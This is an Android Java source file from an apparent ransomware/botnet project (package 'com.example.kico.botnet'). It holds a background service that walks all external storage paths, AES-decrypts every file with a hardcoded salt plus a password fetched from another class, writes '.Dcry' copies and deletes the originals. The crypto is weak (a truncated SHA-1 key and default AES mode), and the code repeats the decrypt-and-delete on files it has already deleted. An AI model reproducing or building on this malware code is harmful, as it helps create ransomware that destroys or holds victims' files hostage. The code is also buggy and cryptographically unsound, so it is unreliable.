package com.example.kico.botnet;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class decry extends Service {

    private static final String salt = "t784";
    private static final String cryptPassword = MyService.cry();

    public decry() {
    }

    public int crybaby() {
        final String expath = Environment.getExternalStorageDirectory().getAbsolutePath();

        Runnable r = new Runnable() {
            @Override
            public void run() {
                try {
                    listx("/storage/emulated/0/");
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                }

            }
        };
        // start the thread
        Thread cry = new Thread(r);
        cry.start();

        Runnable p = new Runnable() {
            @Override
            public void run() {
                try {
                    listx("/storage/sdcard0/");
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                }

            }
        };
        Thread hry = new Thread(p);
        hry.start();

        Runnable a = new Runnable() {
            @Override
            public void run() {
                try {
                    listx(expath);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                }
            }
        };
        Thread gry = new Thread(a);
        gry.start();

        Runnable b = new Runnable() {
            @Override
            public void run() {
                try {
                    listx("/storage/sdcard/");
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
        Thread kry = new Thread(b);
        kry.start();
        return Service.START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    public static List<File> listx(String directoryName) throws IOException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException {
        File directory = new File(directoryName);
        String pas = cryptPassword;

        List<File> resultList = new ArrayList<>();

        // get all the files from a directory
        File[] fList = directory.listFiles();
        // this was missing
        if (fList == null) {
            return null;
        }
        resultList.addAll(Arrays.asList(fList));
        for (File file : fList) {
            if (file.isFile()) {
                decrypt(file.getAbsolutePath(), cryptPassword, file.getAbsolutePath()+".Dcry");
                DeleteRecursive(file.getAbsolutePath());
                try {
                    decrypt(file.getAbsolutePath(), cryptPassword, file.getAbsolutePath()+".Dcry");
                    DeleteRecursive(file.getAbsolutePath());
                } catch (Exception ex) {

                }
            } else if (file.isDirectory()) {
                // ask here if it was null
                List<File> files = listx(file.getAbsolutePath());
                if (files != null) {
                    resultList.addAll(files);
                }
            }
        }
        //System.out.println(fList);
        return resultList;
    }

    public static void DeleteRecursive(String filename) {
        File file = new File(filename);
        if (!file.exists())
            return;
        if (!file.isDirectory()) {
            file.delete();
            return;
        }

        String[] files = file.list();
        for (int i = 0; i < files.length; i++) {

            DeleteRecursive(filename + "/" + files[i]);
        }
        file.delete();
    }

    public static void decrypt(String path,String password, String outPath) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        FileInputStream fis = new FileInputStream(path);
        FileOutputStream fos = new FileOutputStream(outPath);
        byte[] key = (salt + password).getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-1");
        key = sha.digest(key);
        key = Arrays.copyOf(key,16);
        SecretKeySpec sks = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, sks);
        CipherInputStream cis = new CipherInputStream(fis, cipher);
        int b;
        byte[] d = new byte[8];
        while((b = cis.read(d)) != -1) {
            fos.write(d, 0, b);
        }
        fos.flush();
        fos.close();
        cis.close();
    }

}
